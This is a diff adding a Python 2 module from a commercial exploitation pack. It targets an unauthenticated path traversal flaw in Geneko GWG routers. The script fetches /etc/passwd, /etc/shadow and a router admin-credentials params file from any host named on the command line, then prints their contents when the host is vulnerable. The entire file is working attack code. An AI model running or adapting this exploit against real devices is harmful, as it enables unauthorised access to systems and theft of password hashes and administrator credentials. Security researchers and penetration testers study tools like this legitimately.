@@ -1,0 +1,48 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_geneko_1'
+_vendor_ = 'geneko'
+_model_  = ['GWG']
+_vuln_   = 'Unauthenticated Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = 'https://blogs.securiteam.com/index.php/archives/3317'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  urls = [
+    '../../../etc/passwd',
+    '../../../etc/shadow',
+    '../../../../../../../../../../../../mnt/flash/params/j_admin_admin.params',
+  ]
+  for url in urls:    
+    try:
+      url = 'http://%s:%d/%s' % (host,port,url)
+      response = requests.get(url)
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    if response is None:
+      print '[+] %s not vulnerable' % host
+    elif 'No such file or directory' in response.text:
+      print '[+] %s not vulnerable' % host  
+    else:
+      print '[+] %s vulnerable' % host
+      print '[+] URL: %s\n'%url
+      print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
